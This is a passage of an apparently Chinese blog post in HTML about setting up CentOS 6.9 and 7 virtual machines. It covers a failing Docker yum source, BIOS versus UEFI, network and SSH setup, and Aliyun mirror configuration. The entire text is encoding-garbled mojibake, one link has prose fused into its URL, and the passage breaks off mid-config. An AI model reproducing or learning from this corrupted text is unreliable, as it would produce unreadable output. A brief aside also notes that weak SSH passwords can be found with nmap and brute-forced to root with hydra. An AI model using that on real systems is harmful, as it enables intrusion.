æ–‡ä»¶ä¸­é…ç½®çš„é˜¿é‡Œäº‘Dockeré•œåƒæºåœ°å€æ˜¯æ­£ç¡®çš„ã€‚æ‚¨å¯ä»¥è®¿é—®é˜¿é‡Œäº‘çš„å®˜æ–¹æ–‡æ¡£æˆ–é•œåƒæºé¡µé¢æ¥è·å–æœ€æ–°çš„é•œåƒæºåœ°å€ã€‚</p><p>â€‹      æ£€æŸ¥å‘ç°ï¼Œdocker-ce.repoæ–‡ä»¶ä¸­å­˜åœ¨ä¸€äº›ä¹‹å‰å°±æœ‰çš„yumæºé…ç½®ã€‚å¦‚å›¾ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.56.34.png" style="zoom:50%;"><p>â€‹     å°è¯•å°†è¿™ä¸ªæ–‡ä»¶å¤‡ä»½ï¼Œç„¶ååˆ é™¤ï¼Œé‡æ–°ç”Ÿæ‰§è¡Œå‘½ä»¤ç”Ÿæˆæ–°çš„é…ç½®æ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token parameter variable">-r</span> /etc/yum.repos.d /etc/yum.repos.d/docker-ce.backfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2011.00.00.png" alt="æˆªå±2024-12-12 11.00.00"></p><p>é‡æ–°ç”Ÿæˆã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2011.01.36.png" alt="æˆªå±2024-12-12 11.01.36"></p><p>é‡æ–°ç”Ÿæˆçš„æ–‡ä»¶ä»ç„¶æ˜¯æ—§çš„æºã€‚</p><p>å…¶å®ä¸Šé¢çš„è§£å†³æ€è·¯æœ‰é—®é¢˜ï¼Œå› ä¸ºè¿™ä¸ªé“¾æ¥<a href="https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B8%A6%E6%9C%89%E7%89%88%E6%9C%AC%EF%BC%88$releasever%EF%BC%89%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9B%AE%E5%89%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E6%9C%AC%E6%98%AFcentos6.9%E5%B9%B6%E4%B8%94%E5%AE%98%E6%96%B9%E4%B9%9F%E4%B8%8D%E7%BB%B4%E6%8A%A4%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84yum%E6%BA%90%E4%BB%93%E5%BA%93%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5sudo">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoä¸‹è½½çš„æ–‡ä»¶å†…å®¹ï¼Œå°±æ˜¯å¸¦æœ‰ç‰ˆæœ¬ï¼ˆ$releaseverï¼‰çš„ï¼Œå› ä¸ºç›®å‰çš„è™šæ‹Ÿæœºç‰ˆæœ¬æ˜¯centos6.9å¹¶ä¸”å®˜æ–¹ä¹Ÿä¸ç»´æŠ¤è¿™ä¸ªç‰ˆæœ¬çš„yumæºä»“åº“äº†ï¼Œæ‰€ä»¥sudo</a> yum makecache fastçš„æ—¶å€™æ‰ä¼šæŠ¥é”™ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>docker-ce-stable<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Docker CE Stable - <span class="token variable">$basearch</span><span class="token assign-left variable">baseurl</span><span class="token operator">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/<span class="token variable">$releasever</span>/<span class="token variable">$basearch</span>/stable<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èƒ½æƒ³åˆ°çš„æœ€ç›´æ¥çš„ä¸¤ä¸ªåŠæ³•ï¼š</p><ol><li><strong>å‡çº§æ“ä½œç³»ç»Ÿ</strong>ï¼šæœ€ç›´æ¥çš„è§£å†³æ–¹æ¡ˆæ˜¯å‡çº§åˆ°ä¸€ä¸ªå—æ”¯æŒçš„ CentOS ç‰ˆæœ¬ï¼Œå¦‚ CentOS 7 æˆ– CentOS 8ã€‚è¿™æ ·å¯ä»¥ç»§ç»­è·å¾—å®˜æ–¹çš„ç»´æŠ¤å’Œæ›´æ–°ã€‚</li><li><strong>å¯»æ‰¾å…¶ä»–é•œåƒæº</strong>ï¼šæ‚¨å¯ä»¥å¯»æ‰¾å…¶ä»–æä¾› CentOS 6.9 é•œåƒçš„æºã€‚ä¾‹å¦‚ï¼Œä¸€äº›ç¬¬ä¸‰æ–¹å¯èƒ½ä»ç„¶æä¾› CentOS 6.9 çš„é•œåƒã€‚ä½†è¯·æ³¨æ„ï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹æºå¯èƒ½ä¼šå¸¦æ¥å®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¸ä¼šåŠæ—¶æ›´æ–°å®‰å…¨è¡¥ä¸ã€‚</li></ol><p>å…¶ä»–çš„yumæºä¹Ÿæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ã€‚ç›®å‰è²Œä¼¼æœ¬æœºçš„å…¶ä»–yumæºä¹Ÿæœ‰äº›é—®é¢˜ã€‚</p><p>å¦‚æœè®¾ç½®æœ¬æœºçš„yumæºå¯ä»¥å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/hunttown/p/18225058">https://www.cnblogs.com/hunttown/p/18225058</a> </p><p>ä½†centos6.9ç¡®å®æ˜¯æœ‰ç‚¹è¿‡æ—¶äº†ï¼Œæ‰“ç®—å®‰è£…ä¸€ä¸ªcentos7ç‰ˆæœ¬çš„è™šæ‹Ÿæœºã€‚</p></blockquote><h1 id="äºŒã€-centos7"><a href="#äºŒã€-centos7" class="headerlink" title="äºŒã€ centos7"></a>äºŒã€ centos7</h1><h2 id="2-1-å®‰è£…centos7"><a href="#2-1-å®‰è£…centos7" class="headerlink" title="2.1 å®‰è£…centos7"></a>2.1 å®‰è£…centos7</h2><ul><li>é€‰æ‹©åˆ›å»ºè‡ªå®šè™šæ‹Ÿæœºã€‚</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.29.13.png" style="zoom:50%;"><ul><li>é€‰æ‹©linuxï¼ŒCentOS 7 64ä½</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.31.54.png" style="zoom:50%;"><ul><li>é€‰æ‹©ä¼ ç»ŸBIOS</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.33.26.png" style="zoom:50%;"><blockquote><h4 id="BIOSæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#BIOSæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="BIOSæ˜¯ä»€ä¹ˆï¼Ÿ"></a>BIOSæ˜¯ä»€ä¹ˆï¼Ÿ</h4><p>BIOSï¼ˆBasic Input/Output Systemï¼ŒåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼‰æ˜¯è®¡ç®—æœºå¯åŠ¨æ—¶åŠ è½½çš„ç¬¬ä¸€ä¸ªè½¯ä»¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªå›ºä»¶ç¨‹åºï¼Œå­˜å‚¨åœ¨è®¡ç®—æœºä¸»æ¿ä¸Šçš„ä¸€ä¸ªèŠ¯ç‰‡ä¸­ã€‚BIOSçš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p><ol><li><strong>ç¡¬ä»¶åˆå§‹åŒ–</strong>ï¼šåœ¨æ“ä½œç³»ç»ŸåŠ è½½ä¹‹å‰ï¼ŒBIOSè´Ÿè´£å¯¹è®¡ç®—æœºçš„ç¡¬ä»¶ç»„ä»¶è¿›è¡Œåˆå§‹åŒ–ï¼ŒåŒ…æ‹¬CPUã€å†…å­˜ã€ç¡¬ç›˜ã€æ˜¾å¡ç­‰ã€‚</li><li><strong>å¯åŠ¨é¡ºåºè®¾ç½®</strong>ï¼šBIOSå…è®¸ç”¨æˆ·è®¾ç½®å¯åŠ¨è®¾å¤‡çš„ä¼˜å…ˆçº§ï¼Œæ¯”å¦‚ä»ç¡¬ç›˜ã€å…‰ç›˜ã€USBè®¾å¤‡æˆ–ç½‘ç»œå¯åŠ¨ã€‚</li><li><strong>ç¡¬ä»¶æ£€æµ‹</strong>ï¼šåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ï¼ŒBIOSä¼šæ£€æµ‹ç³»ç»Ÿä¸­çš„ç¡¬ä»¶è®¾å¤‡ï¼Œç¡®ä¿å®ƒä»¬æ­£å¸¸å·¥ä½œã€‚</li><li><strong>æ“ä½œç³»ç»Ÿå¼•å¯¼</strong>ï¼šBIOSé€šè¿‡å¼•å¯¼æ‰‡åŒºï¼ˆboot sectorï¼‰åŠ è½½æ“ä½œç³»ç»Ÿçš„å¼•å¯¼ç¨‹åºï¼Œç„¶åå°†æ§åˆ¶æƒäº¤ç»™æ“ä½œç³»ç»Ÿã€‚</li><li><strong>ç³»ç»Ÿè®¾ç½®</strong>ï¼šBIOSæä¾›äº†ä¸€ä¸ªè®¾ç½®ç•Œé¢ï¼Œç”¨æˆ·å¯ä»¥é…ç½®ç³»ç»Ÿçš„å„ç§å‚æ•°ï¼Œå¦‚æ—¶é—´ã€æ—¥æœŸã€å¯åŠ¨é¡ºåºã€CPUé¢‘ç‡ç­‰ã€‚</li><li><strong>é”™è¯¯æŠ¥å‘Š</strong>ï¼šå¦‚æœç¡¬ä»¶åˆå§‹åŒ–è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼ŒBIOSä¼šé€šè¿‡å±å¹•æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œå¸®åŠ©ç”¨æˆ·è¯Šæ–­é—®é¢˜ã€‚</li></ol><p>éšç€æŠ€æœ¯çš„å‘å±•ï¼ŒBIOSé€æ¸è¢«UEFIï¼ˆUnified Extensible Firmware Interfaceï¼Œç»Ÿä¸€å¯æ‰©å±•å›ºä»¶æ¥å£ï¼‰æ‰€å–ä»£ã€‚UEFIæä¾›äº†æ›´å¤šçš„åŠŸèƒ½ï¼Œå¦‚æ›´å¤§çš„å­˜å‚¨ç©ºé—´ã€å›¾å½¢ç•Œé¢ã€å®‰å…¨å¯åŠ¨ç­‰ï¼Œå¹¶ä¸”æ”¯æŒå¤§äº2.2TBçš„ç¡¬ç›˜å’Œ64ä½æ“ä½œç³»ç»Ÿã€‚ç„¶è€Œï¼ŒBIOSå’ŒUEFIåœ¨æ¦‚å¿µä¸Šæ˜¯ç›¸ä¼¼çš„ï¼Œéƒ½æ˜¯è®¡ç®—æœºå¯åŠ¨è¿‡ç¨‹ä¸­çš„å…³é”®ç»„ä»¶ã€‚</p><h4 id="å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™é€‰BIOSè¿˜æ˜¯UEFIï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™é€‰BIOSè¿˜æ˜¯UEFIï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™é€‰BIOSè¿˜æ˜¯UEFIï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™é€‰BIOSè¿˜æ˜¯UEFIï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h4><p>åœ¨å®‰è£…è™šæ‹Ÿæœºæ—¶é€‰æ‹©BIOSæˆ–UEFIå–å†³äºæ“ä½œç³»ç»Ÿéœ€æ±‚ã€è™šæ‹Ÿæœºè½¯ä»¶æ”¯æŒåŠä¸ªäººåå¥½ã€‚BIOSï¼ˆåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼‰å…¼å®¹æ€§å¼ºï¼Œé€‚åˆæ—§æ“ä½œç³»ç»Ÿï¼Œä½†åŠŸèƒ½æœ‰é™ï¼Œå¦‚æœ€å¤§2TBç¡¬ç›˜å’Œ4GBå†…å­˜é™åˆ¶ã€‚UEFIï¼ˆç»Ÿä¸€å¯æ‰©å±•å›ºä»¶æ¥å£ï¼‰æ˜¯ç°ä»£æ ‡å‡†ï¼Œæ”¯æŒå¤§å®¹é‡ç¡¬ç›˜ã€æ›´å¤šå†…å­˜ï¼Œæä¾›å®‰å…¨å¯åŠ¨å’Œå¿«é€Ÿå¯åŠ¨ç‰¹æ€§ã€‚è‹¥æ“ä½œç³»ç»Ÿå’Œè™šæ‹Ÿæœºè½¯ä»¶æ”¯æŒï¼Œä¸”éœ€è¦é«˜çº§åŠŸèƒ½ï¼ŒUEFIæ˜¯ä¼˜é€‰ã€‚ç„¶è€Œï¼Œå¯¹äºæ—§ç³»ç»Ÿæˆ–ç‰¹æ®Šéœ€æ±‚ï¼ŒBIOSå¯èƒ½æ›´åˆé€‚ã€‚é€‰æ‹©å‰ï¼Œåº”è€ƒè™‘æ“ä½œç³»ç»Ÿå…¼å®¹æ€§ã€è™šæ‹Ÿæœºè½¯ä»¶åŠŸèƒ½åŠä¸ªäººå¯¹é…ç½®çš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚</p></blockquote><ul><li>é€‰æ‹©æ–°å»ºè™šæ‹Ÿç›˜</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.51.12.png" style="zoom:50%;"><ul><li>ç‚¹å‡»å®Œæˆ</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.51.51.png" style="zoom:50%;"><ul><li>å­˜å‚¨</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.52.30.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.54.12.png" style="zoom:40%;"><ul><li>å®‰è£…é•œåƒ</li></ul><p>è™šæ‹Ÿæœº=&gt;è®¾ç½®=&gt;CD/DVDï¼ˆIDEï¼‰</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.54.48.png" style="zoom:40%;"><p>é€‰æ‹©é•œåƒå¹¶è¿æ¥</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.56.06.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.57.08.png" style="zoom:40%;"><p>é€‰æ‹©ç¬¬ä¸€é¡¹æˆ–ç¬¬äºŒé¡¹ã€‚å›è½¦ã€‚</p><ul><li>ç³»ç»Ÿå®‰è£…</li></ul><p>é€‰æ‹©è¯­è¨€ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.59.31.png" style="zoom:30%;"><p>ç»§ç»­è®¾ç½®</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.00.26.png" style="zoom:30%;"><p>é€‰æ‹©DATE&amp;TIMEï¼Œè®¾ç½®æ—¶é—´ä¸€èˆ¬é€‰æ‹©ä¸Šæµ·ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.03.46.png" style="zoom:30%;"><p>ç‚¹å‡»SOFTWARE SELECTION è¿›å…¥ç¯å¢ƒé€‰æ‹©ï¼Œè¿™ä¸ªé•œåƒä¸ºæœ€å°åŒ–é•œåƒï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªé€‰é¡¹ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.05.48.png" style="zoom:30%;"><p>ç‚¹å‡»å®Œæˆåè¿›å…¥å®‰è£…ç›®æ ‡ä½ç½®ï¼Œç›´æ¥ç‚¹å‡»å®Œæˆ</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.06.37.png" style="zoom:30%;"><p>ç‚¹å‡»ç½‘ç»œï¼Œæ‰“å¼€ï¼Œç„¶åç‚¹å‡»å®Œæˆã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.07.28.png" style="zoom:30%;"><p>ç‚¹å‡»å¼€å§‹å®‰è£…ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.08.08.png" style="zoom:30%;"><p>è®¾ç½®å¯†ç ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.08.33.png" style="zoom:30%;"><p>è€å¿ƒç­‰å¾…å®‰è£…å®Œæˆã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.09.15.png" style="zoom:30%;"><p>å®Œæˆåç‚¹å‡»é‡å¯ã€‚</p><h2 id="2-2-é—®é¢˜è§£å†³"><a href="#2-2-é—®é¢˜è§£å†³" class="headerlink" title="2.2 é—®é¢˜è§£å†³"></a>2.2 é—®é¢˜è§£å†³</h2><p>ç™»å½•ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.14.05.png" style="zoom:50%;"><p>ifconfigå‘½ä»¤ä¸å­˜åœ¨ï¼š</p><h3 id="2-2-1-ç½‘ç»œè¿é€šé—®é¢˜è§£å†³"><a href="#2-2-1-ç½‘ç»œè¿é€šé—®é¢˜è§£å†³" class="headerlink" title="2.2.1 ç½‘ç»œè¿é€šé—®é¢˜è§£å†³"></a>2.2.1 ç½‘ç»œè¿é€šé—®é¢˜è§£å†³</h3><p>ip addræŸ¥çœ‹ç½‘ç»œåœ°å€ï¼š</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.18.24.png" alt="æˆªå±2024-12-12 16.18.24"></p><p>yum å®‰è£…net-tools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.19.38.png" alt="æˆªå±2024-12-12 16.19.38"></p><p>çœ‹æ ·å­æ˜¯ç½‘ç»œçš„é—®é¢˜ï¼Œå¾—å…ˆè§£å†³ç½‘ç»œé—®é¢˜ã€‚</p><ul><li>è§£å†³ç½‘è·¯è¿æ¥é—®é¢˜</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.22.08.png" style="zoom:50%;"><p>é…ç½®ï¼šç›®å‰åªä¿ç•™äº†è¿™å‡ é¡¹ï¼Œ</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.24.36.png" style="zoom:50%;"><p>é‡å¯ç½‘å¡ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.26.03.png" style="zoom:50%;"><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.26.36.png" alt="æˆªå±2024-12-12 16.26.36"></p><p>æˆåŠŸè·å–åˆ°IPï¼Œ192.168.155.34.</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.27.14.png" alt="æˆªå±2024-12-12 16.27.14" style="zoom:50%;"><p>æˆåŠŸpingé€šäº’è”ç½‘ã€‚</p><h3 id="2-2-2-å®‰è£…net-toolså·¥å…·åŒ…"><a href="#2-2-2-å®‰è£…net-toolså·¥å…·åŒ…" class="headerlink" title="2.2.2 å®‰è£…net-toolså·¥å…·åŒ…"></a>2.2.2 å®‰è£…net-toolså·¥å…·åŒ…</h3><p>yum updateæŠ¥é”™ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.28.59.png" alt="æˆªå±2024-12-12 16.28.59" style="zoom:50%;"><p>å›¾ç‰‡ä¸­çš„é”™è¯¯ä¿¡æ¯è¡¨æ˜ <code>yum</code> åœ¨å°è¯•æ›´æ–°æ—¶æ— æ³•ä» CentOS çš„é•œåƒåˆ—è¡¨ä¸­æ£€ç´¢ä¿¡æ¯ï¼Œå› ä¸ºæ— æ³•è§£æ <code>mirrorlist.centos.org</code> çš„ä¸»æœºåã€‚è¿™å¯èƒ½æ˜¯ç”±äºç½‘ç»œè¿æ¥é—®é¢˜ã€DNS è§£æé—®é¢˜æˆ– CentOS é•œåƒæºé…ç½®é—®é¢˜ã€‚</p><p>åé¢é…ç½®å®Œæˆyumæºä¹‹åå†å®‰è£…ã€‚</p><h3 id="2-2-3-ç”¨macç»ˆç«¯è¿›è¡Œsshè¿æ¥ç®¡ç†"><a href="#2-2-3-ç”¨macç»ˆç«¯è¿›è¡Œsshè¿æ¥ç®¡ç†" class="headerlink" title="2.2.3 ç”¨macç»ˆç«¯è¿›è¡Œsshè¿æ¥ç®¡ç†"></a>2.2.3 ç”¨macç»ˆç«¯è¿›è¡Œsshè¿æ¥ç®¡ç†</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.32.53.png" alt="æˆªå±2024-12-12 16.32.53"></p><p>ã€è¿™é‡Œæä¸€ä¸ªç‚¹ï¼Œé»˜è®¤å®‰è£…å¼€å¯sshæœåŠ¡ï¼Œå¦‚æœè®¾ç½®çš„æ—¶å€™ç”¨äº†å¼±å£ä»¤ï¼Œç”¨nmapç­‰æ‰«ææ”»å‡»å‘ç°ip:portä¹‹åï¼Œå¯ä»¥ç›´æ¥ç”¨hydraçˆ†ç ´ç™»å½•ï¼Œè€Œä¸”ç™»å½•å°±æ˜¯rootç”¨æˆ·ã€‚ã€‘</p><h3 id="2-2-4-é…ç½®yumæº"><a href="#2-2-4-é…ç½®yumæº" class="headerlink" title="2.2.4 é…ç½®yumæº"></a>2.2.4 é…ç½®yumæº</h3><p>å¤‡ä»½åŸå§‹æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">cd /etc/yum.repos.dmv CentOS-Base.repo CentOS-Base.repo.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ä¿®æ”¹ CentOS-Base.repo æ–‡ä»¶</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># CentOS-Base.repo</span><span class="token comment">#</span><span class="token comment"># The mirror system uses the connecting IP address of the client and the</span><span class="token comment"># update status of each mirror to pick mirrors that are updated to and</span><span class="token comment"># geographically close to the client.  You should use this for CentOS updates</span><span class="token comment"># unless you are manually picking other mirrors.</span><span class="token comment">#</span><span class="token comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><span class="token comment"># remarked out baseurl= line instead.</span><span class="token comment">#</span><span class="token comment">#</span> <span class="token punctuation">[</span>base<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Base - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/os/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#released updates </span><span class="token punctuation">[</span>updates<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Updates - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/updates/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#additional packages that may be useful</span><span class="token punctuation">[</span>extras<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Extras - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/extras/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#additional packages that extend functionality of existing packages</span><span class="token punctuation">[</span>centosplus<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Plus - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/centosplus/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#contrib - packages by Centos Users</span><span class="token punctuation">[</span>contrib<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Contrib - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/contrib/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left 